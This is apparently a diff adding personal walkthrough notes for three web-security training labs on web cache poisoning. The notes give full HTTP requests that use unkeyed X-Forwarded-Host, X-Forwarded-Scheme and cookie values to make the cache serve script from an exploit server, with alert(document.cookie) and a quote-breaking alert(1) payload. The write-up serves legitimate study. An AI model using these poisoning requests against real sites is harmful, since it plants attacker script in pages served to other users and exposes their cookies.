@@ -1,0 +1,181 @@
+If you see this in the front page's source:
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+We have a chance to this vulnerability
+
+
+Task 1:
+///Lab: Web cache poisoning with an unkeyed header///
+
+Open the page, and send the GET / request to the repeater.
+In this request in the response there is the three line:
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+If we send the request again, it changes:
+Cache-Control: max-age=30
+Age: 1
+X-Cache: hit
+Okay. Now modify the request: 
+GET /?ab=asd HTTP/2
+
+And in response we got:
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+
+Because we are generating a new cache key. Go to exploit server.
+Now. In repeater (since 'This lab supports the X-Forwarded-Host header.') add a new line with the X-Forwarded-Host header like this:
+GET /?ab=abcde HTTP/2
+Host: 0a72006a0473c9cf86a894c2000c0037.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Priority: u=0, i
+Te: trailers
+X-Forwarded-Host: exploit-0ae500f204abc99086f893dd019b00dd.exploit-server.net >>>this is our exploit servers address
+
+Send this two times (store it). In the response source code you will see this part:
+   <body>
+        <script type="text/javascript" src="//exploit-0ae500f204abc99086f893dd019b00dd.exploit-server.net/resources/js/tracking.js"></script>
+        <script src="/resources/labheader/js/labHeader.js">
+
+So the script will looking forward to a file (/resources/js/tracking.js) from our server, so in the exploit server settings change the 'File:' to /resources/js/tracking.js, and into body type what the lab wants:
+'alert(document.cookie);'
+Then click on store.
+All we have to now is in the repeater remove the ?ab=abcde part from the request like:
+GET / HTTP/2
+Host: 0a72006a0473c9cf86a894c2000c0037.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+....
+....
+Priority: u=0, i
+Te: trailers
+X-Forwarded-Host: exploit-0ae500f204abc99086f893dd019b00dd.exploit-server.net
+Send it two times, and in browser refresh the front page.
+
+Task 2:
+///Lab: Web cache poisoning with an unkeyed cookie///
+
+Open the site in burp, and refresh the page 3 times. Then go to proxy>>http history. If you check the request there will ge 3 GET / requests:
+1st:
+GET / HTTP/1.1
+Host: 0aae00c00365f872803d036300780052.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+response:
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=30
+Age: 28
+X-Cache: hit
+Content-Length: 10923
+
+2nd:
+GET / HTTP/2
+Host: 0aae00c00365f872803d036300780052.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+
+response:
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+Set-Cookie: session=EeR8iUCsGnaNB1IsKV8XTlOdQVWCi49I; Secure; HttpOnly; SameSite=None
+Set-Cookie: fehost=prod-cache-01; Secure; HttpOnly
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+Content-Length: 10923
+
+3rd:
+GET / HTTP/2
+Host: 0aae00c00365f872803d036300780052.web-security-academy.net
+Cookie: session=EeR8iUCsGnaNB1IsKV8XTlOdQVWCi49I; fehost=prod-cache-01
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+response:
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+Set-Cookie: fehost=prod-cache-01; Secure; HttpOnly
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+Content-Length: 10923
+
+As you can see the headers changed step-by-step. And also notice that the fehost value is reflected in the source code (and in the script part!:
+<script>
+            data = {"host":"0aae00c00365f872803d036300780052.web-security-academy.net","path":"/","frontend":"prod-cache-01"}
+        </script>
+
+Send the 3rd GET / request to the repeater. And change the / part to /?as=xyc and send the request. As you can see we can set a new cache key. So its vulnerable. Now change the fehost value, maybe we can change it.
+And if you change it to anything, its reflected in the source code:
+       <script>
+            data = {"host":"0aae00c00365f872803d036300780052.web-security-academy.net","path":"/","frontend":"asd"}
+        </script>
+Now we have to implement our alert(1) into the fehost, and switch back the request to the frontpage:
+GET / HTTP/2
+Host: 0aae00c00365f872803d036300780052.web-security-academy.net
+Cookie: session=EeR8iUCsGnaNB1IsKV8XTlOdQVWCi49I; fehost=xyc"-alert(1)-"asd
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Send this until the X-Cache's value wont be 'hit', and refresh the page in the browser.
+
+Task 3:
+///Lab: Web cache poisoning with multiple headers///
+
+Open the site in burp. Send the / request and the GET /resources/js/tracking.js request to repeater.
+To validate its vulnerable, do the same like before (add ?as=asd to the get request...etc...)
+In the lab description: 'This lab supports both the X-Forwarded-Host and X-Forwarded-Scheme headers.'
+So the starting request is:
+GET /?cb=asd HTTP/2
+Host: 0a0b007c0381086e80e562df003000a0.web-security-academy.net
+Cookie: session=BIx4h3UkLh11kclE1onXwEVYEgojV3oJ
+....
+Ive tried the Host header, but nothing changed, so i tried Scheme header like:
+GET /?cb=asds HTTP/2
+Host: 0a0b007c0381086e80e562df003000a0.web-security-academy.net
+Cookie: session=BIx4h3UkLh11kclE1onXwEVYEgojV3oJ
+...
+X-Forwarded-Scheme: http
+Dont forget to change the cache buster value! If you send this request, you will get a 302 found, so our request got redirected...but where? that was the x-forwarded-host will give us. So modify the request:
+GET /?cb=asdssx HTTP/2
+Host: 0a0b007c0381086e80e562df003000a0.web-security-academy.net
+Cookie: session=BIx4h3UkLh11kclE1onXwEVYEgojV3oJ
+...
+...
+X-Forwarded-Scheme: nothttp
+X-Forwarded-Host: google.com
+And if you open this page, it will redirect you to google.com/?cb=asds. But how can we use this?
+We have a script request, and we have an exploit server. First modify the exploit server...
+To the File: part copy into: /resources/js/tracking.js >>>this will be our requests route...
+To the body part: alert(document.cookie);
+And store it.
+Copy out the exploit server address.
+Now modify the script request like this:
+GET /resources/js/tracking.js HTTP/2
+Host: 0a0b007c0381086e80e562df003000a0.web-security-academy.net
+Cookie: session=BIx4h3UkLh11kclE1onXwEVYEgojV3oJ
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
+Accept: */*
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a0b007c0381086e80e562df003000a0.web-security-academy.net/
+Sec-Fetch-Dest: script
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+X-Forwarded-Scheme: http
+X-Forwarded-Host: exploit-0a2b00ec035108fc808e612501b2002f.exploit-server.net
+
+As you can see i copied the two vulnerable headers into the request, and i give our exploit server as the redirection. What will this do? If we send this request this will redirect
+us to exploit-0a2b00ec035108fc808e612501b2002f.exploit-server.net/resources/js/tracking.js which will be the: alert(document.cookie);
+So when the page loads in, and this runs down, we will get an alert. So send the request until we get x-cache: hit. And refresh the page in the browser.
+
